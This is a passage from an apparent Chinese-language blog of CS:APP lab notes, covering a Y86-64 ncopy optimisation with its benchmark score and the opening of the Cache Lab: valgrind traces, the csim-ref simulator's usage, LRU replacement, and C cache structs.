</span><span id=__span-113-48><a id=__codelineno-113-48 name=__codelineno-113-48></a><span class=nl>L:</span>
</span><span id=__span-113-49><a id=__codelineno-113-49 name=__codelineno-113-49></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-113-50><a id=__codelineno-113-50 name=__codelineno-113-50></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-113-51><a id=__codelineno-113-51 name=__codelineno-113-51></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-52><a id=__codelineno-113-52 name=__codelineno-113-52></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>L1</span>
</span><span id=__span-113-53><a id=__codelineno-113-53 name=__codelineno-113-53></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-54><a id=__codelineno-113-54 name=__codelineno-113-54></a><span class=nl>L1:</span>
</span><span id=__span-113-55><a id=__codelineno-113-55 name=__codelineno-113-55></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-113-56><a id=__codelineno-113-56 name=__codelineno-113-56></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-113-57><a id=__codelineno-113-57 name=__codelineno-113-57></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>8</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-58><a id=__codelineno-113-58 name=__codelineno-113-58></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>L2</span>
</span><span id=__span-113-59><a id=__codelineno-113-59 name=__codelineno-113-59></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-60><a id=__codelineno-113-60 name=__codelineno-113-60></a><span class=nl>L2:</span>
</span><span id=__span-113-61><a id=__codelineno-113-61 name=__codelineno-113-61></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>16</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-113-62><a id=__codelineno-113-62 name=__codelineno-113-62></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$24</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-113-63><a id=__codelineno-113-63 name=__codelineno-113-63></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>16</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-64><a id=__codelineno-113-64 name=__codelineno-113-64></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$24</span><span class=p>,</span><span class=nv>%rsi</span>
</span><span id=__span-113-65><a id=__codelineno-113-65 name=__codelineno-113-65></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-113-66><a id=__codelineno-113-66 name=__codelineno-113-66></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>test2</span>
</span><span id=__span-113-67><a id=__codelineno-113-67 name=__codelineno-113-67></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-68><a id=__codelineno-113-68 name=__codelineno-113-68></a><span class=nl>test2:</span>
</span><span id=__span-113-69><a id=__codelineno-113-69 name=__codelineno-113-69></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$-3</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>         </span><span class=c1># 先减，判断够不够3个</span>
</span><span id=__span-113-70><a id=__codelineno-113-70 name=__codelineno-113-70></a><span class=w>    </span><span class=nf>jge</span><span class=w> </span><span class=no>L</span>
</span><span id=__span-113-71><a id=__codelineno-113-71 name=__codelineno-113-71></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$2</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>          </span><span class=c1># -1则不剩了，直接Done,0 剩一个, 1剩2个</span>
</span><span id=__span-113-72><a id=__codelineno-113-72 name=__codelineno-113-72></a><span class=w>    </span><span class=nf>je</span><span class=w> </span><span class=no>R0</span>
</span><span id=__span-113-73><a id=__codelineno-113-73 name=__codelineno-113-73></a><span class=w>    </span><span class=nf>jl</span><span class=w> </span><span class=no>Done</span>
</span><span id=__span-113-74><a id=__codelineno-113-74 name=__codelineno-113-74></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-113-75><a id=__codelineno-113-75 name=__codelineno-113-75></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r9</span>
</span><span id=__span-113-76><a id=__codelineno-113-76 name=__codelineno-113-76></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-77><a id=__codelineno-113-77 name=__codelineno-113-77></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=mi>8</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-78><a id=__codelineno-113-78 name=__codelineno-113-78></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-113-79><a id=__codelineno-113-79 name=__codelineno-113-79></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>R2</span>
</span><span id=__span-113-80><a id=__codelineno-113-80 name=__codelineno-113-80></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-81><a id=__codelineno-113-81 name=__codelineno-113-81></a><span class=nl>R2:</span>
</span><span id=__span-113-82><a id=__codelineno-113-82 name=__codelineno-113-82></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=nv>%r9</span>
</span><span id=__span-113-83><a id=__codelineno-113-83 name=__codelineno-113-83></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Done</span>
</span><span id=__span-113-84><a id=__codelineno-113-84 name=__codelineno-113-84></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-113-85><a id=__codelineno-113-85 name=__codelineno-113-85></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>Done</span>
</span><span id=__span-113-86><a id=__codelineno-113-86 name=__codelineno-113-86></a><span class=nl>R0:</span>
</span><span id=__span-113-87><a id=__codelineno-113-87 name=__codelineno-113-87></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-113-88><a id=__codelineno-113-88 name=__codelineno-113-88></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-113-89><a id=__codelineno-113-89 name=__codelineno-113-89></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-113-90><a id=__codelineno-113-90 name=__codelineno-113-90></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Done</span>
</span><span id=__span-113-91><a id=__codelineno-113-91 name=__codelineno-113-91></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span></code></pre></div></td></tr></table></div> <p>注意，<code>rmmovq</code>不改变条件寄存器的值，所以我们也可以把<code>andq</code>插进中间来消除气泡。</p> <h4 id=_5>测试结果及分数<a class=headerlink href=#_5 title="Permanent link">¶</a></h4> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-114-1>1</a></span>
<span class=normal><a href=#__codelineno-114-2>2</a></span>
<span class=normal><a href=#__codelineno-114-3>3</a></span>
<span class=normal><a href=#__codelineno-114-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-114-1><a id=__codelineno-114-1 name=__codelineno-114-1></a>pipe$<span class=w> </span>./correctness.pl
</span><span id=__span-114-2><a id=__codelineno-114-2 name=__codelineno-114-2></a>pipe$<span class=w> </span>./benchmark.pl
</span><span id=__span-114-3><a id=__codelineno-114-3 name=__codelineno-114-3></a>Average<span class=w> </span>CPE<span class=w>     </span><span class=m>8</span>.16
</span><span id=__span-114-4><a id=__codelineno-114-4 name=__codelineno-114-4></a>Score<span class=w>   </span><span class=m>46</span>.7/60.0
</span></code></pre></div></td></tr></table></div> </li> </ol> <h2 id=cache-lab>Cache Lab<a class=headerlink href=#cache-lab title="Permanent link">¶</a></h2> <ol> <li> <h3 id=_6>实验概览<a class=headerlink href=#_6 title="Permanent link">¶</a></h3> <p>这次实验的任务是制作自己的缓存系统，具体来说是:</p> <ul> <li>修改<code>csim.c</code>，实现一个缓存模拟器，根据给定的 trace 文件来输出对应的操作</li> <li>修改<code>trans.c</code>，利用缓存机制加速矩阵运算</li> </ul> <p>先来了解一下实验用作输入数据的 trace 文件，可以使用 <code>valgrind --log-fd=1 --tool=lackey -v --trace-mem=yes ls -l</code> 来体验一下，具体做的事情，就是把执行 <code>ls -l</code> 这个命令时访问内存的日志输出到终端中，大概是这样的：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-115-1> 1</a></span>
<span class=normal><a href=#__codelineno-115-2> 2</a></span>
<span class=normal><a href=#__codelineno-115-3> 3</a></span>
<span class=normal><a href=#__codelineno-115-4> 4</a></span>
<span class=normal><a href=#__codelineno-115-5> 5</a></span>
<span class=normal><a href=#__codelineno-115-6> 6</a></span>
<span class=normal><a href=#__codelineno-115-7> 7</a></span>
<span class=normal><a href=#__codelineno-115-8> 8</a></span>
<span class=normal><a href=#__codelineno-115-9> 9</a></span>
<span class=normal><a href=#__codelineno-115-10>10</a></span>
<span class=normal><a href=#__codelineno-115-11>11</a></span>
<span class=normal><a href=#__codelineno-115-12>12</a></span>
<span class=normal><a href=#__codelineno-115-13>13</a></span>
<span class=normal><a href=#__codelineno-115-14>14</a></span>
<span class=normal><a href=#__codelineno-115-15>15</a></span>
<span class=normal><a href=#__codelineno-115-16>16</a></span>
<span class=normal><a href=#__codelineno-115-17>17</a></span>
<span class=normal><a href=#__codelineno-115-18>18</a></span>
<span class=normal><a href=#__codelineno-115-19>19</a></span>
<span class=normal><a href=#__codelineno-115-20>20</a></span>
<span class=normal><a href=#__codelineno-115-21>21</a></span>
<span class=normal><a href=#__codelineno-115-22>22</a></span>
<span class=normal><a href=#__codelineno-115-23>23</a></span>
<span class=normal><a href=#__codelineno-115-24>24</a></span>
<span class=normal><a href=#__codelineno-115-25>25</a></span>
<span class=normal><a href=#__codelineno-115-26>26</a></span>
<span class=normal><a href=#__codelineno-115-27>27</a></span>
<span class=normal><a href=#__codelineno-115-28>28</a></span>
<span class=normal><a href=#__codelineno-115-29>29</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-115-1><a id=__codelineno-115-1 name=__codelineno-115-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>valgrind<span class=w> </span>--log-fd<span class=o>=</span><span class=m>1</span><span class=w> </span>--tool<span class=o>=</span>lackey<span class=w> </span>-v<span class=w> </span>--trace-mem<span class=o>=</span>yes<span class=w> </span>ls<span class=w> </span>-l
</span><span id=__span-115-2><a id=__codelineno-115-2 name=__codelineno-115-2></a>I<span class=w>  </span>048bfa31,5
</span><span id=__span-115-3><a id=__codelineno-115-3 name=__codelineno-115-3></a><span class=w> </span>S<span class=w> </span>1ffefff9d8,8
</span><span id=__span-115-4><a id=__codelineno-115-4 name=__codelineno-115-4></a>I<span class=w>  </span><span class=m>04966200</span>,4
</span><span id=__span-115-5><a id=__codelineno-115-5 name=__codelineno-115-5></a>I<span class=w>  </span><span class=m>04966204</span>,7
</span><span id=__span-115-6><a id=__codelineno-115-6 name=__codelineno-115-6></a><span class=w> </span>L<span class=w> </span>04a7adf8,8
</span><span id=__span-115-7><a id=__codelineno-115-7 name=__codelineno-115-7></a>I<span class=w>  </span>0496620b,5
</span><span id=__span-115-8><a id=__codelineno-115-8 name=__codelineno-115-8></a>I<span class=w>  </span><span class=m>04966210</span>,2
</span><span id=__span-115-9><a id=__codelineno-115-9 name=__codelineno-115-9></a>I<span class=w>  </span><span class=m>04966219</span>,2
</span><span id=__span-115-10><a id=__codelineno-115-10 name=__codelineno-115-10></a>I<span class=w>  </span>0496621b,2
</span><span id=__span-115-11><a id=__codelineno-115-11 name=__codelineno-115-11></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>
</span><span id=__span-115-12><a id=__codelineno-115-12 name=__codelineno-115-12></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>Counted<span class=w> </span><span class=m>0</span><span class=w> </span>calls<span class=w> </span>to<span class=w> </span>main<span class=o>()</span>
</span><span id=__span-115-13><a id=__codelineno-115-13 name=__codelineno-115-13></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>
</span><span id=__span-115-14><a id=__codelineno-115-14 name=__codelineno-115-14></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>Jccs:
</span><span id=__span-115-15><a id=__codelineno-115-15 name=__codelineno-115-15></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>   </span>total:<span class=w>         </span><span class=m>140</span>,271
</span><span id=__span-115-16><a id=__codelineno-115-16 name=__codelineno-115-16></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>   </span>taken:<span class=w>         </span><span class=m>53</span>,218<span class=w> </span><span class=o>(</span><span class=m>38</span>%<span class=o>)</span>
</span><span id=__span-115-17><a id=__codelineno-115-17 name=__codelineno-115-17></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>
</span><span id=__span-115-18><a id=__codelineno-115-18 name=__codelineno-115-18></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>Executed:
</span><span id=__span-115-19><a id=__codelineno-115-19 name=__codelineno-115-19></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>   </span>SBs<span class=w> </span>entered:<span class=w>   </span><span class=m>158</span>,266
</span><span id=__span-115-20><a id=__codelineno-115-20 name=__codelineno-115-20></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>   </span>SBs<span class=w> </span>completed:<span class=w> </span><span class=m>100</span>,650
</span><span id=__span-115-21><a id=__codelineno-115-21 name=__codelineno-115-21></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>   </span>guest<span class=w> </span>instrs:<span class=w>  </span><span class=m>882</span>,729
</span><span id=__span-115-22><a id=__codelineno-115-22 name=__codelineno-115-22></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>   </span>IRStmts:<span class=w>       </span><span class=m>5</span>,657,624
</span><span id=__span-115-23><a id=__codelineno-115-23 name=__codelineno-115-23></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>
</span><span id=__span-115-24><a id=__codelineno-115-24 name=__codelineno-115-24></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>Ratios:
</span><span id=__span-115-25><a id=__codelineno-115-25 name=__codelineno-115-25></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>   </span>guest<span class=w> </span>instrs<span class=w> </span>:<span class=w> </span>SB<span class=w> </span><span class=nv>entered</span><span class=w>  </span><span class=o>=</span><span class=w> </span><span class=m>55</span><span class=w> </span>:<span class=w> </span><span class=nv>10</span>
</span><span id=__span-115-26><a id=__codelineno-115-26 name=__codelineno-115-26></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>        </span>IRStmts<span class=w> </span>:<span class=w> </span>SB<span class=w> </span><span class=nv>entered</span><span class=w>  </span><span class=o>=</span><span class=w> </span><span class=m>357</span><span class=w> </span>:<span class=w> </span><span class=nv>10</span>
</span><span id=__span-115-27><a id=__codelineno-115-27 name=__codelineno-115-27></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w>        </span>IRStmts<span class=w> </span>:<span class=w> </span>guest<span class=w> </span><span class=nv>instr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>64</span><span class=w> </span>:<span class=w> </span><span class=nv>10</span>
</span><span id=__span-115-28><a id=__codelineno-115-28 name=__codelineno-115-28></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>
</span><span id=__span-115-29><a id=__codelineno-115-29 name=__codelineno-115-29></a><span class=o>==</span><span class=nv>667398</span><span class=o>==</span><span class=w> </span>Exit<span class=w> </span>code:<span class=w>       </span><span class=m>0</span>
</span></code></pre></div></td></tr></table></div> <p>每一条对内存访问的记录格式是 <code>[空格]操作符 地址,大小</code>，以 <code>I</code> 开头的是载入指令的记录，不算在内存访问中。</p> <ul> <li>M 表示数据修改，需要一次载入 + 一次存储，也就是相当于两次访问</li> <li>S 表示数据存储</li> <li>L 表示数据载入</li> <li>地址指的是一个 64 位的 16 进制内存地址</li> <li>大小表示该操作内存访问的字节数</li> </ul> <p>我们要做的实际上是读入 valgrind 生成的 trace 日志，并统计出 hit, miss 和 eviction 的次数。同时实验已经给出了一个参考程序 csim-ref，我们的任务就就是山寨一个这样的程序：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-116-1> 1</a></span>
<span class=normal><a href=#__codelineno-116-2> 2</a></span>
<span class=normal><a href=#__codelineno-116-3> 3</a></span>
<span class=normal><a href=#__codelineno-116-4> 4</a></span>
<span class=normal><a href=#__codelineno-116-5> 5</a></span>
<span class=normal><a href=#__codelineno-116-6> 6</a></span>
<span class=normal><a href=#__codelineno-116-7> 7</a></span>
<span class=normal><a href=#__codelineno-116-8> 8</a></span>
<span class=normal><a href=#__codelineno-116-9> 9</a></span>
<span class=normal><a href=#__codelineno-116-10>10</a></span>
<span class=normal><a href=#__codelineno-116-11>11</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-116-1><a id=__codelineno-116-1 name=__codelineno-116-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>./csim-ref<span class=w> </span>-s<span class=w> </span><span class=m>4</span><span class=w> </span>-E<span class=w> </span><span class=m>1</span><span class=w> </span>-b<span class=w> </span><span class=m>4</span><span class=w> </span>-t<span class=w> </span>traces/yi.trace<span class=w> </span>
</span><span id=__span-116-2><a id=__codelineno-116-2 name=__codelineno-116-2></a>hits:4<span class=w> </span>misses:5<span class=w> </span>evictions:3
</span><span id=__span-116-3><a id=__codelineno-116-3 name=__codelineno-116-3></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>./csim-ref<span class=w> </span>-v<span class=w> </span>-s<span class=w> </span><span class=m>4</span><span class=w> </span>-E<span class=w> </span><span class=m>1</span><span class=w> </span>-b<span class=w> </span><span class=m>4</span><span class=w> </span>-t<span class=w> </span>traces/yi.trace
</span><span id=__span-116-4><a id=__codelineno-116-4 name=__codelineno-116-4></a>L<span class=w> </span><span class=m>10</span>,1<span class=w> </span>miss<span class=w> </span>
</span><span id=__span-116-5><a id=__codelineno-116-5 name=__codelineno-116-5></a>M<span class=w> </span><span class=m>20</span>,1<span class=w> </span>miss<span class=w> </span>hit<span class=w> </span>
</span><span id=__span-116-6><a id=__codelineno-116-6 name=__codelineno-116-6></a>L<span class=w> </span><span class=m>22</span>,1<span class=w> </span>hit<span class=w> </span>
</span><span id=__span-116-7><a id=__codelineno-116-7 name=__codelineno-116-7></a>S<span class=w> </span><span class=m>18</span>,1<span class=w> </span>hit<span class=w> </span>
</span><span id=__span-116-8><a id=__codelineno-116-8 name=__codelineno-116-8></a>L<span class=w> </span><span class=m>110</span>,1<span class=w> </span>miss<span class=w> </span>eviction<span class=w> </span>
</span><span id=__span-116-9><a id=__codelineno-116-9 name=__codelineno-116-9></a>L<span class=w> </span><span class=m>210</span>,1<span class=w> </span>miss<span class=w> </span>eviction<span class=w> </span>
</span><span id=__span-116-10><a id=__codelineno-116-10 name=__codelineno-116-10></a>M<span class=w> </span><span class=m>12</span>,1<span class=w> </span>miss<span class=w> </span>eviction<span class=w> </span>hit<span class=w> </span>
</span><span id=__span-116-11><a id=__codelineno-116-11 name=__codelineno-116-11></a>hits:4<span class=w> </span>misses:5<span class=w> </span>evictions:3
</span></code></pre></div></td></tr></table></div> <p>这个模拟器有 6 个参数：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-117-1>1</a></span>
<span class=normal><a href=#__codelineno-117-2>2</a></span>
<span class=normal><a href=#__codelineno-117-3>3</a></span>
<span class=normal><a href=#__codelineno-117-4>4</a></span>
<span class=normal><a href=#__codelineno-117-5>5</a></span>
<span class=normal><a href=#__codelineno-117-6>6</a></span>
<span class=normal><a href=#__codelineno-117-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-117-1><a id=__codelineno-117-1 name=__codelineno-117-1></a>Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;
</span><span id=__span-117-2><a id=__codelineno-117-2 name=__codelineno-117-2></a>    • -h: Optional help flag that prints usage info
</span><span id=__span-117-3><a id=__codelineno-117-3 name=__codelineno-117-3></a>    • -v: Optional verbose flag that displays trace info
</span><span id=__span-117-4><a id=__codelineno-117-4 name=__codelineno-117-4></a>    • -s &lt;s&gt;: Number of set index bits (S = 2^s is the number of sets)
</span><span id=__span-117-5><a id=__codelineno-117-5 name=__codelineno-117-5></a>    • -E &lt;E&gt;: Associativity (number of lines per set)
</span><span id=__span-117-6><a id=__codelineno-117-6 name=__codelineno-117-6></a>    • -b &lt;b&gt;: Number of block bits (B = 2^b is the block size)
</span><span id=__span-117-7><a id=__codelineno-117-7 name=__codelineno-117-7></a>    • -t &lt;tracefile&gt;: Name of the valgrind trace to replay
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=part-a-writing-a-cache-simulator>Part A: Writing a Cache Simulator<a class=headerlink href=#part-a-writing-a-cache-simulator title="Permanent link">¶</a></h3> <p>Part A 要求在<code>csim.c</code>下编写一个高速缓存模拟器来对内存读写操作进行正确的反馈。模拟器不需要考虑加载指令，要做出的反馈有 3 种：</p> <ul> <li>hit：命中，表示要操作的数据在对应组的其中一行</li> <li>miss：不命中，表示要操作的数据不在对应组的任何一行</li> <li>eviction：驱赶，表示要操作的数据的对应组已满，进行了替换操作</li> </ul> <h4 id=cache>Cache 结构<a class=headerlink href=#cache title="Permanent link">¶</a></h4> <p><img alt="alt text" src=../../img/image-96.png></p> <p>Cache 类似于一个二维数组，它有 S = 2 ^ s 组，每组有 E 行，每行存储的字节也是固定的。其中，每行都有一个有效位，和一个标记位。想要查找到对应的字节，我们的地址需要三部分组成：</p> <ul> <li>s: 索引位，找到对应的组序号</li> <li>tag: 标记位，在组中的每一行进行匹配，判断能否命中</li> <li>b: 块偏移，表明在找到的行中的具体位置。本实验不考虑块偏移，完全可以忽略</li> </ul> <p>那 Cache 中的有效位是干什么的呢？判断该行是否为空。这里有一个概念：冷不命中，表示该缓存块为空造成的不命中。而一旦确定不命中不是冷不命中，那么就需要考虑行替换的问题了。行替换关乎着 Cache 的效率，是 Cache 设计的核心。</p> <h4 id=_7>替换策略<a class=headerlink href=#_7 title="Permanent link">¶</a></h4> <p>当 CPU 要处理的字不在组中任何一行，且组中没有一个空行，那就必须从里面选取一个非空行进行替换。选取哪个空行进行替换呢？书上给了我们两种策略：</p> <ul> <li>LFU: 最不常使用策略。替换在过去某个窗口时间内引用次数最少的那一行</li> <li>LRU: 最近最少使用策略。替换最后一次访问时间最久远的哪一行</li> </ul> <p>本实验要求采取的策略为 LRU。</p> <h4 id=_8>数据结构<a class=headerlink href=#_8 title="Permanent link">¶</a></h4> <p>定义Cache结构体:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-118-1>1</a></span>
<span class=normal><a href=#__codelineno-118-2>2</a></span>
<span class=normal><a href=#__codelineno-118-3>3</a></span>
<span class=normal><a href=#__codelineno-118-4>4</a></span>
<span class=normal><a href=#__codelineno-118-5>5</a></span>
<span class=normal><a href=#__codelineno-118-6>6</a></span>
<span class=normal><a href=#__codelineno-118-7>7</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-118-1><a id=__codelineno-118-1 name=__codelineno-118-1></a><span class=k>typedef</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>cache_</span>
</span><span id=__span-118-2><a id=__codelineno-118-2 name=__codelineno-118-2></a><span class=p>{</span>
</span><span id=__span-118-3><a id=__codelineno-118-3 name=__codelineno-118-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>S</span><span class=p>;</span>
</span><span id=__span-118-4><a id=__codelineno-118-4 name=__codelineno-118-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>E</span><span class=p>;</span>
</span><span id=__span-118-5><a id=__codelineno-118-5 name=__codelineno-118-5></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>B</span><span class=p>;</span>
</span><span id=__span-118-6><a id=__codelineno-118-6 name=__codelineno-118-6></a><span class=w>    </span><span class=n>Cache_line</span><span class=w> </span><span class=o>**</span><span class=n>line</span><span class=p>;</span>
</span><span id=__span-118-7><a id=__codelineno-118-7 name=__codelineno-118-7></a><span class=p>}</span><span class=w> </span><span class=n>Cache</span><span class=p>;</span>
</span></code></pre></div></td></tr></table></div> <p>用Cache表示一个缓存，它包括 S, E, B 等特征，以及前面说过的，每一个缓存类似于一个二维数组，数组的每一个元素就是缓存中的行，所以用一个line来表示这一信息：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-119-1>1</a></span>
<span class=normal><a href=#__codelineno-119-2>2</a></span>
<span class=normal><a href=#__codelineno-119-3>3</a></span>
<span class=normal><a href=#__codelineno-119-4>4</a></span>
<span class=normal><a href=#__codelineno-119-5>5</a></span>
<span class=normal><a href=#__codelineno-119-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-119-1><a id=__codelineno-119-1 name=__codelineno-119-1></a><span class=k>typedef</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>cache_line</span>
</span><span id=__span-119-2><a id=__codelineno-119-2 name=__codelineno-119-2></a><span class=p>{</span>
</span><span id=__span-119-3><a id=__codelineno-119-3 name=__codelineno-119-3></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>valid</span><span class=p>;</span><span class=w>     </span><span class=c1>// 有效位</span>
</span><span id=__span-119-4><a id=__codelineno-119-4 name=__codelineno-119-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>tag</span><span class=p>;</span><span class=w>       </span><span class=c1>// 标记位</span>
</span><span id=__span-119-5><a id=__codelineno-119-5 name=__codelineno-119-5></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>time_tamp</span><span class=p>;</span><span class=w> </span><span class=c1>// 时间戳, 是 LRU 策略需要用到的特征</span>
</span><span id=__span-119-6><a id=__codelineno-119-6 name=__codelineno-119-6></a><span class=p>}</span><span class=w> </span><span class=n>Cache_line</span><span class=p>;</span>
</span></code></pre></div></td></tr></table></div> <p>Cache 初始值设置如下：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-120-1> 1</a></span>
<span class=normal><a href=#__codelineno-120-2> 2</a></span>
<span class=normal><a href=#__codelineno-120-3> 3</a></span>
<span class=normal><a href=#__codelineno-120-4> 4</a></span>
<span class=normal><a href=#__codelineno-120-5> 5</a></span>
<span class=normal><a href=#__codelineno-120-6> 6</a></span>
<span class=normal><a href=#__codelineno-120-7> 7</a></span>
<span class=normal><a href=#__codelineno-120-8> 8</a></span>
<span class=normal><a href=#__codelineno-120-9> 9</a></span>
<span class=normal><a href=#__codelineno-120-10>10</a></span>
<span class=normal><a href=#__codelineno-120-11>11</a></span>
<span class=normal><a href=#__codelineno-120-12>12</a></span>
<span class=normal><a href=#__codelineno-120-13>13</a></span>
<span class=normal><a href=#__codelineno-120-14>14</a></span>
<span class=normal><a href=#__codelineno-120-15>15</a></span>
<span class=normal><a href=#__codelineno-120-16>16</a></span>
